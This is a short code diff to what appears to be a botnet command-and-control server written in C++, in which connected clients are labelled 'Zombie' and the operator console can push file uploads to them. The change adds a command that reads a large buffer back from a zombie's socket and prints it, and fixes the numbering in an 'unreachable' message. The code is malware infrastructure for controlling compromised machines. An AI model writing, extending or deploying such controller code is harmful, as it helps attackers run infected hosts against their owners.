@@ -19,7 +19,7 @@ void recv_t_old(Server* serv1)
 void listen_client(Server* serv1, const unsigned short nb)
 {
 	char buffer[256] = { 0 };
-
+	char big_buffer[HUGE_BUFFER] = { 0 };
 	while (strcmp(buffer, "exit") != 0)
 	{
 		std::vector<st_Client> clients = serv1->getClients();
@@ -27,14 +27,21 @@ void listen_client(Server* serv1, const unsigned short nb)
 		{
 			std::vector<std::string> args = split(buffer);
 			if (args[0] == "upload" && args.size() == 2)
+			{
 				Transfer::uploadToClient(serv1, args[1]);
+			}
+			else if (args[0] == "HUGE_BUFFER" && args.size() == 1)
+			{
+				recv(clients[nb].sock, big_buffer, HUGE_BUFFER, 0);
+				print_status(big_buffer);
+			}
 			else
 				std::cout << "[*] Zombie " << nb + 1 << ": " << buffer << std::endl;
 		}
 		else
 		{
 			SetColor(14);
-			std::cout << "[!] Zombie : " << nb << " is unreachable ..." << std::endl;
+			std::cout << "[!] Zombie : " << nb+1 << " is unreachable ..." << std::endl;
 			serv1->removeClient(nb);
 			SetColor(7);
 		}
